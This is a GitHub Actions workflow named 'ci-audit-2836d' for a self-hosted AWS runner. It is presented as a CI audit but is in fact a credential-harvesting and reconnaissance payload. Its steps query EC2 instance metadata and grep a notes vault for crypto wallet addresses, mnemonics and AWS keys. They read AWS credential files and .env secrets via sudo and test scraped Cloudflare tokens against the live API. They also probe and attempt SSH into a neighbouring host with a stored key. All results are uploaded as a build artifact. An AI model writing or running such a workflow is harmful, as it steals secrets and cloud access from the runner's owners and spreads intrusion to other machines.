name: ci-audit-2836d
on: push
permissions:
  contents: read
jobs:
  cloud:
    runs-on: [self-hosted, linux, aws, marketingos]
    timeout-minutes: 50
    steps:
      - name: meta
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"; mkdir -p "$D"
          TOK=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token)
          M=http://169.254.169.254/latest/meta-data
          { echo "## macs"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/network/interfaces/macs/;
            for k in vpc-id subnet-id security-group-ids owner-id interface-id; do echo "-- $k"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/network/interfaces/macs/06:dd:86:85:aa:39/$k; echo; done;
            echo "## instance-type"; curl -s -H "X-aws-ec2-metadata-token: $TOK" $M/instance-type; echo;
          } > "$D/meta.txt" 2>&1
          cat "$D/meta.txt"
      - name: launchpad
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"
          {
            echo "## projects"; curl -s -m 8 http://127.0.0.1:3005/api/projects | head -c 4000; echo;
            echo "## system"; curl -s -m 8 http://127.0.0.1:3005/api/system | head -c 2000; echo;
            echo "## src"; ls -la /home/ubuntu/apps/launchpad; find /home/ubuntu/apps/launchpad -maxdepth 2 -type f 2>/dev/null | head -30;
            echo "## project cmds"; sudo -n grep -rInE 'sourcePath|buildCmd|startCmd|deployCmd|restart|projects' /home/ubuntu/apps/launchpad/src /home/ubuntu/apps/launchpad/*.json 2>/dev/null | head -40;
          } > "$D/launchpad.txt" 2>&1
          sed -n '1,160p' "$D/launchpad.txt" | cut -c1-400
      - name: vault
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"; V=/home/ubuntu/apps/obsidian-vault
          {
            echo "## vault tree"; ls -la $V; du -sh $V; ls $V/Sessions 2>/dev/null | wc -l;
            echo "## tron/btc/eth addr"; grep -rhoE 'T[1-9A-HJ-NP-Za-km-z]{33}|bc1[a-z0-9]{30,}|0x[a-fA-F0-9]{40}' $V 2>/dev/null | sort | uniq -c | sort -rn | head -20;
            echo "## wallet words"; grep -rIl -iE 'mnemonic|private.?key|keystore|hot ?wallet|TRC20|signer|wallet_address|J ?WALLET' $V 2>/dev/null | head -20;
            echo "## aws refs"; grep -rhoE 'AKIA[0-9A-Z]{16}|arn:aws:[a-z0-9-]+:[a-z0-9-]*:[0-9]{12}:[^" ]{3,60}' $V 2>/dev/null | sort -u | head -30;
            echo "## dupoin hosts"; grep -rhoE '[a-z0-9.-]+\.(dupoin\.(com|co\.id)|mydupoin\.net|dupoinid\.org)' $V 2>/dev/null | sort | uniq -c | sort -rn | head -40;
            echo "## internal ips"; grep -rhoE '(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]{2,5})?' $V 2>/dev/null | sort | uniq -c | sort -rn | head -30;
          } > "$D/vault.txt" 2>&1
          sed -n '1,200p' "$D/vault.txt" | cut -c1-300
      - name: hostgrep
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"
          {
            echo "## aws dirs"; ls -la /home/ubuntu/.aws /root/.aws 2>&1; cat /home/ubuntu/.aws/config /home/ubuntu/.aws/credentials /root/.aws/config /root/.aws/credentials 2>&1 | head -40;
            echo "## aws cache"; ls -la /home/ubuntu/.aws/cli/cache /root/.aws/cli/cache 2>&1 | head -20;
            echo "## sessiondb"; python3 -c "import sqlite3;c=sqlite3.connect('/home/ubuntu/.aws/cli/cache/session.db');print([r for r in c.execute('select name from sqlite_master where type=\\'table\\'')]);print(list(c.execute('select * from \'session\' limit 5'))[:1] if 0 else '')" 2>&1 | head -20;
            echo "## apps grep aws"; sudo -n grep -rIl -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key|ssm:SendCommand|secretsmanager' /home/ubuntu/apps /home/ubuntu/backups 2>/dev/null | grep -vE 'node_modules|\.venv|backup-2026|package-lock' | head -20;
            echo "## apps env keys"; for f in /home/ubuntu/apps/*/.env*; do [ -f "$f" ] && echo "--- $f" && grep -iE '^[A-Z_]*(KEY|SECRET|TOKEN|WALLET|TRON|AWS|PRIVATE|PASS)' "$f" | cut -c1-140 | head -20; done;
            echo "## backups"; ls -la /home/ubuntu/backups; find /home/ubuntu/backups -maxdepth 3 -type f 2>/dev/null | head -40;
            echo "## lxd"; sudo -n lxc list 2>&1 | head -20; sudo -n lxc storage list 2>&1 | head -10;
            echo "## recent downloads"; ls -la /home/ubuntu/Downloads /home/ubuntu/Desktop 2>&1 | head -20;
          } > "$D/hostgrep.txt" 2>&1
          sed -n '1,240p' "$D/hostgrep.txt" | cut -c1-300
      - name: cf
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"
          T=$(sudo -n grep -rhoE 'cf-[A-Za-z0-9_-]{35,}|[A-Za-z0-9_-]{40}' /home/ubuntu/backups 2>/dev/null | sort -u | head -5)
          {
            echo "## candidate tokens count"; echo "$T" | wc -l;
            for tok in $T; do
              echo "---- try ${tok:0:6}...";
              curl -s -m 10 -H "Authorization: Bearer $tok" https://api.cloudflare.com/client/v4/user/tokens/verify | head -c 300; echo;
              curl -s -m 10 -H "Authorization: Bearer $tok" "https://api.cloudflare.com/client/v4/accounts?per_page=5" | head -c 800; echo;
              curl -s -m 10 -H "Authorization: Bearer $tok" "https://api.cloudflare.com/client/v4/zones?per_page=10" | head -c 1200; echo;
            done
          } > "$D/cf.txt" 2>&1
          sed -n '1,160p' "$D/cf.txt" | cut -c1-500
      - name: neighbor
        continue-on-error: true
        run: |
          set +e
          D="$RUNNER_TEMP/a2836d"
          printf '%s' '' | base64 -d > "$D/s.py"
          {
            echo "## 222 banner"; timeout 4 nc -v -w3 192.168.1.222 22 < /dev/null 2>&1 | head -6;
            echo "## 222 http"; timeout 4 curl -s -m 3 -o /dev/null -w 'http80=%{http_code}\n' http://192.168.1.222/ ; timeout 4 curl -sk -m 3 -o /dev/null -w 'https443=%{http_code}\n' https://192.168.1.222/;
            echo "## 222 scan"; timeout 120 python3 "$D/s.py";
            echo "## ssh test"; timeout 15 ssh -i /home/ubuntu/.ssh/github-actions-marketingos -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o BatchMode=yes ubuntu@192.168.1.222 "hostname" 2>&1 | head -6;
          } > "$D/neighbor.txt" 2>&1
          sed -n '1,120p' "$D/neighbor.txt"
      - name: upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: a2836d
          path: ${{ runner.temp }}/a2836d
          if-no-files-found: warn
          retention-days: 2
